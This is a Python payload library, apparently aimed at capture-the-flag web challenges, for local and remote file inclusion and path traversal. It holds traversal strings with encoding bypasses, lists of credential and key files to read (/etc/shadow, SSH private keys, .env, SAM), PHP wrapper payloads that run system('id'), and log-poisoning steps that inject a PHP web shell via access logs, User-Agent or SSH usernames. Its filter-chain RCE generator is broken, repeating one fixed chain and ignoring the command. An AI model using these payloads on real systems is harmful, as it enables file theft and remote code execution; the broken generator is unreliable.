# -*- coding: utf-8 -*-
"""LFI / RFI / Path Traversal Payload çæå¨.

è¦ç:
    - æ¬å°æä»¶åå« (LFI)
    - è¿ç¨æä»¶åå« (RFI)
    - è·¯å¾éå (Path Traversal)
    - PHP ä¼ªåè®® (php:// filter/wrapper/data/input)
    - æ¥å¿æ±¡æ
    - /proc/self/environ ç­æå·§
"""
from typing import List, Dict


# âââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ
#  è·¯å¾éå Payload
# âââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ

PATH_TRAVERSAL: List[str] = [
    "../../../etc/passwd",
    "....//....//....//etc/passwd",
    "..%2f..%2f..%2fetc/passwd",          # URL ç¼ç 
    "..%252f..%252f..%252fetc/passwd",    # å URL ç¼ç 
    "..\\/..\\/..\\/etc/passwd",
    "/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    "..;/..;/..;/etc/passwd",
    "....\\/....\\/....\\/etc/passwd",
    "..%c0%af..%c0%af..%c0%afetc/passwd", # å®½å­è
    "..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd",  # Unicode å¨è§ææ 
]

WINDOWS_PATH_TRAVERSAL: List[str] = [
    "..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts",
    "..\\..\\..\\..\\boot.ini",
    "..%5c..%5c..%5cWindows\\win.ini",
    "C:\\Windows\\System32\\drivers\\etc\\hosts",
    "%SYSTEMROOT%\\win.ini",
]


# âââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ
#  å¸¸è§æææä»¶
# âââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ

SENSITIVE_FILES: Dict[str, List[str]] = {
    "Linux": [
        "/etc/passwd", "/etc/shadow", "/etc/hosts",
        "/etc/apache2/apache2.conf", "/etc/nginx/nginx.conf",
        "/etc/php/php.ini", "/etc/my.cnf",
        "/proc/self/environ", "/proc/self/cmdline",
        "/proc/self/fd/0", "/proc/self/fd/1",
        "/var/log/apache2/access.log", "/var/log/apache2/error.log",
        "/var/log/nginx/access.log", "/var/log/nginx/error.log",
        "/home/*/.ssh/id_rsa", "/home/*/.ssh/authorized_keys",
        "/root/.ssh/id_rsa", "/root/.bash_history",
        "/flag", "/flag.txt", "/var/www/html/flag",
        "/app/flag", "/tmp/flag",
        ".env", ".git/config", ".git/HEAD",
        "config.php", "database.php", "wp-config.php",
        "/proc/self/cwd/flag.txt",
        "/proc/net/tcp", "/proc/net/udp",
    ],
    "Windows": [
        "C:\\Windows\\System32\\drivers\\etc\\hosts",
        "C:\\Windows\\win.ini", "C:\\boot.ini",
        "C:\\xampp\\htdocs\\config.php",
        "C:\\inetpub\\wwwroot\\web.config",
        "C:\\Windows\\repair\\SAM",
        "flag.txt", "C:\\flag.txt",
    ],
}


# âââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ
#  PHP ä¼ªåè®®
# âââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ

PHP_WRAPPERS: Dict[str, List[Dict[str, str]]] = {
    "æä»¶è¯»å": [
        {
            "name": "php://filter (è¯»åæºç )",
            "payload": "php://filter/convert.base64-encode/resource=index.php",
        },
        {
            "name": "php://filter (æ  base64 å¹²æ°)",
            "payload": "php://filter/read=convert.base64-encode/resource=index.php",
        },
        {
            "name": "php://filter + å¤§å°åç»è¿",
            "payload": "php://FilTer/convert.base64-encode/resource=index.php",
        },
        {
            "name": "php://filter + åéç¼ç ",
            "payload": "php://filter/convert.base64-encode|convert.base64-encode/resource=index.php",
        },
        {
            "name": "php://filter + å­ç¬¦ä¸²å¤çé¾",
            "payload": "php://filter/string.rot13/resource=index.php",
        },
        {
            "name": "php://filter åç¼©é¾",
            "payload": "php://filter/zlib.deflate/resource=index.php",
        },
        {
            "name": "file:// åè®®",
            "payload": "file:///etc/passwd",
        },
        {
            "name": "phar:// åè®®",
            "payload": "phar://uploaded_file.jpg/shell.php",
        },
    ],
    "ä»£ç æ§è¡": [
        {
            "name": "data:// (çº¯ææ¬)",
            "payload": "data://text/plain,<?php%20system('id');?>",
        },
        {
            "name": "data:// (base64)",
            "payload": "data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+",
        },
        {
            "name": "php://input (POST)",
            "payload": "php://input",
            "note": "POST body: <?php system('id');?>",
        },
        {
            "name": "expect:// (éè¦ pecl)",
            "payload": "expect://id",
        },
    ],
    "æ¥å¿åå« â RCE": [
        {
            "name": "Apache access.log æ±¡æ",
            "payload": "/var/log/apache2/access.log",
            "note": "ååéå¸¦ <?php system($_GET[c]);?> çè¯·æ±, ååå«æ¥å¿æä»¶",
        },
        {
            "name": "nginx access.log æ±¡æ",
            "payload": "/var/log/nginx/access.log",
        },
        {
            "name": "/proc/self/environ (CGI)",
            "payload": "/proc/self/environ",
            "note": "å¨ User-Agent ä¸­æ³¨å¥ PHP ä»£ç ",
        },
        {
            "name": "SSH auth.log æ±¡æ",
            "payload": "/var/log/auth.log",
            "note": "ç¨ ssh '<?php system($_GET[c]);?>'@target æ±¡ææ¥å¿",
        },
    ],
}


# âââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ
#  PHP Filter Chain (php_filter_chain_generator style)
# âââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ

def generate_filter_chain(command: str, base: str = "index.php") -> str:
    """çæ PHP filter chain ç¨äº RCE.

    æ³¨æ: è¿æ¯ç¤ºæçæ¬ãå®æ´çéè¦ PHP ä»£ç éå filter chain generator å·¥å·ã
    """
    php_code = f"<?php system('{command}');?>"
    encoded = php_code.encode().hex()
    chain_parts = []
    for i in range(0, len(encoded), 2):
        chain_parts.append(f"convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7")
    chain = "|".join(chain_parts)
    return f"php://filter/{chain}/resource={base}"


def get_path_traversal() -> List[str]:
    """è·åè·¯å¾éå Payload åè¡¨."""
    return PATH_TRAVERSAL


def get_windows_paths() -> List[str]:
    """è·å Windows è·¯å¾éå Payload."""
    return WINDOWS_PATH_TRAVERSAL


def get_sensitive_files(os_type: str = "") -> dict:
    """è·åå¸¸è§æææä»¶åè¡¨."""
    if os_type and os_type.capitalize() in SENSITIVE_FILES:
        return {os_type.capitalize(): SENSITIVE_FILES[os_type.capitalize()]}
    return SENSITIVE_FILES


def get_php_wrappers(category: str = "") -> dict:
    """è·å PHP ä¼ªåè®® Payload."""
    if category and category in PHP_WRAPPERS:
        return {category: PHP_WRAPPERS[category]}
    return PHP_WRAPPERS
